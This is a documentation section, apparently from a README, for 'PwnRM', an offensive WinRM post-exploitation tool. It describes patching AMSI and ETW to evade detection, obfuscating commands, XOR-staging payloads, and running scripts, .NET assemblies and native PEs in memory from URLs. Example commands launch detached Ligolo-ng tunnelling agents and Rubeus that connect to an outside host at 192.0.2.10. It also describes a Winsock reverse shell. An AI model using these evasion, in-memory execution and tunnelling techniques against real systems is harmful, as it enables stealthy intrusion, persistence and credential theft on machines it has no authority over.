# Runtime controls and staging

## OPSEC profiles

`!opsec` selects `stealth`, `balanced`, `aggressive`, or `hybrid-cloud`.
Profiles currently affect:

- randomized delay before interactive commands;
- conservative textual backtick obfuscation for single-line raw PowerShell
  commands in the two obfuscating profiles;
- upload/download fragment size, capped at 64 KiB for PSRP safety.

Multiline scripts, module commands, and `Invoke-Expression` are not rewritten.
The profile's user-agent value is exposed through the Python API for an
integrator, but changing profiles after connection does not mutate pypsrp's
already-open HTTP session.

Textual obfuscation is not an AST transformation and is not a security
boundary. Script Block Logging, AMSI, ETW, EDR, and server-side audit policy
remain independent controls.

## AMSI and ETW (`!evasion`, `!amsi`)

Selectors are applied independently:

```text
!evasion edr
!evasion amsi
!evasion etw
!evasion amsi etw
!amsi
```

With no selector, AMSI and ETW patches are attempted. `edr` inventories a
small known driver list and SecurityCenter2 AV products. The generated native
calls validate library/function addresses and `VirtualProtect` results.

The ETW stubs are architecture-specific: x64 uses `xor eax,eax; ret`; x86 uses
the appropriate callee stack cleanup for `EtwEventWrite` and
`EtwEventWriteFull`. These changes affect only the current remote PowerShell
host process and may be detected or blocked. PwnRM does not disable kernel
telemetry or guarantee EDR bypass.

## File transfer

`!upload` stages chunks to a random remote temporary file, moves the completed
file, and verifies SHA-256. `!download` streams Base64 chunks and appends a
SHA-256 trailer. Directories are compressed to a temporary ZIP and the ZIP is
removed after collection.

Controls include:

- regular-file and maximum-size checks before upload;
- configurable `PWNRM_MAX_UL` / `PWNRM_MAX_DL`, defaulting to 256 MiB;
- bounded buffers and remote interrupt on download overrun;
- validated remote absolute paths;
- local symlink refusal, `O_NOFOLLOW` where available, and mode `0600`;
- buffer clearing after integrity failure or completion.

## XOR staging

`!upload --xor` stores bytes transformed by a random per-process key. The remote
loader reverses that transformation in memory:

```text
!upload --xor payload.ps1 C:\Windows\Temp\payload.bin
!psrun --xor C:\Windows\Temp\payload.bin
```

The upload and execution commands must use the same running PwnRM process. XOR
is staging obfuscation, not authenticated encryption and not a replacement for
TLS.

## PowerShell execution (`!psrun`)

`!psrun` accepts exactly one HTTP(S) URL or remote file path. It reads bytes,
optionally applies the process XOR key, decodes UTF-8, creates a ScriptBlock,
and invokes it in the current runspace. Temporary byte/text/script variables
are cleared in a `finally` block.

## .NET execution (`!netrun`)

`!netrun` accepts an HTTP(S) URL or remote file path followed by arguments. It
loads the assembly from bytes and invokes either a parameterless entry point or
one accepting `string[]`. `Console.Out` and `Console.Error` are captured and
restored in `finally`, even when the assembly throws. The input buffer is then
cleared.

## Native and managed PE execution (`!noconsolation`)

`!noconsolation` accepts a PE from the operator filesystem or an HTTP(S) URL.
Use `--remote` with an explicit `native` or `managed` mode when `SOURCE` is
already a path on the Windows target:

```text
# No output capture: launch in a background runspace and return immediately.
!noconsolation native ligolo-agent.exe -connect 192.0.2.10:11601
!noconsolation managed Rubeus.exe triage

# No capture, but survive closure of the PwnRM/WinRM runspace.
!noconsolation native --detached agent.exe -connect 192.0.2.10:11601

# Opt in to foreground output capture (60-second native default timeout).
!noconsolation native --capture-output whoami.exe /all
!noconsolation managed --capture-output Rubeus.exe triage

# Execute an existing target-side file without first downloading it locally.
!noconsolation native --remote C:\Windows\System32\whoami.exe /all
```

Output capture is intentionally opt-in. If neither `--capture-output` nor its
`--capture` alias is specified, native execution sets No-Consolation's
no-output option, uses no loader timeout, begins the operation in a separate
PowerShell runspace, prints only the PwnRM background job ID, and leaves the
payload running. Managed assemblies use the same background-by-default policy.
The background context belongs to the current remote RunspacePool, so the
interactive PwnRM session must remain open for a long-lived payload. Single
command mode (`-X`) closes the pool and is therefore unsuitable for this
session-owned default mode. `!jobs list`, `!jobs status ID`, `!jobs output ID`,
and `!jobs stop ID` manage these jobs. Output becomes available after a
runspace job completes.

`--detached` is the explicit independent-job mode. PwnRM creates a hidden
PowerShell process through local WMI, passes the loader and payload from the
WinRM process to that process over a random named pipe, waits only for an
in-memory-load acknowledgement, and returns the target PID. No payload PE is
written to the target when `SOURCE` is operator-local or an operator-fetched
URL. The process survives closure of PwnRM's RunspacePool, but not host reboot,
explicit process termination, or endpoint controls. It cannot be combined with
`--capture-output`. PwnRM records the PID in a mode-`0600` local registry so
`!jobs status ID` and `!jobs stop ID` continue to work after reconnecting to the
same target. Payload arguments are not persisted.
PwnRM also persists the process creation timestamp and verifies it before any
stop operation, so a recycled Windows PID is never treated as the original job.

Native execution uses the upstream
[No-Consolation](https://github.com/fortra/No-Consolation) BOF through
[Invoke-Bof](https://github.com/airbus-cert/Invoke-Bof). PwnRM fetches pinned
revisions in the operator process, verifies exact SHA-256 digests, patches the
loader in memory, and stages bytes over PSRP; the target does not fetch those
assets. Set `PWNRM_NOCONSOLATION_ASSET_DIR` to a trusted local directory
containing `Invoke-Bof.ps1`, `NoConsolation.x64.o`, and
`NoConsolation.x86.o` for offline operation. Operator payloads are limited to
64 MiB by default (`PWNRM_MAX_EXEC`, maximum 512 MiB).

Automatic PE inspection selects managed or native mode for operator-side
payloads and rejects native architecture mismatch. A remote path cannot be
inspected until execution and therefore requires an explicit mode. Native
loader switches `--method`, `--unicode`, `--link-to-peb`, `--dont-unload`, and
`--load-all-dependencies` are available for DLL-specific cases. In-process
native loading can crash or corrupt the WinRM provider if the payload or its
dependencies are incompatible; use it only in a disposable, authorized test
context before an engagement.

## Detached Ligolo-ng agent (`!ligolo`)

`!ligolo` is a managed detached native No-Consolation workflow inspired by the
Sliver alias layout in
[KriyosArcane/sliver-ligolo-ng](https://github.com/KriyosArcane/sliver-ligolo-ng).
It supports multiple tracked agents, lifecycle control, restart during the
current operator session, connection/TLS profiles, and an optional official
release fetcher.

```text
# Fetch the latest official Windows build for the target architecture. PwnRM
# verifies the archive against the release checksum before extracting agent.exe.
!ligolo fetch

# Auto-use a cached agent, or fetch one when none is installed.
!ligolo start -connect 192.0.2.10:11601 -ignore-cert -retry

# Operator-local build: transferred through PSRP and the named pipe.
!ligolo start --agent ./agent.exe -connect 192.0.2.10:11601 -ignore-cert

# Existing target-side agent (the source file is already on target disk).
!ligolo start --remote C:\ProgramData\agent.exe -connect 192.0.2.10:11601 -ignore-cert

# Save and use a certificate-pinned connection profile.
!ligolo profile save lab 192.0.2.10:11601 --accept-fingerprint <64_HEX_SHA256>
!ligolo start --profile lab

# Multi-agent lifecycle.
!ligolo list
!ligolo status JOB_ID
!ligolo restart JOB_ID
!ligolo stop JOB_ID
!ligolo cleanup
```

The launcher always selects native, no-output, detached execution. The agent PE
is not written to the target when it originates on the operator. Automatic
fetching uses the official GitHub release API, accepts `amd64`, `386`, and
`arm64`, verifies the published checksum, and stores the operator copy under
`PWNRM_DIR` with restrictive permissions. PwnRM manages agent processes, not
the Ligolo proxy's TUN interfaces or routes.

## Reverse shell (`!revshell`)

The reverse shell uses native Winsock/CreateProcess imports in the remote
PowerShell process. Listener input is validated as IPv4 and port 1–65535; IPv6
is rejected explicitly. It is a raw command channel without authentication or
encryption and should only be used on an engagement-controlled network.
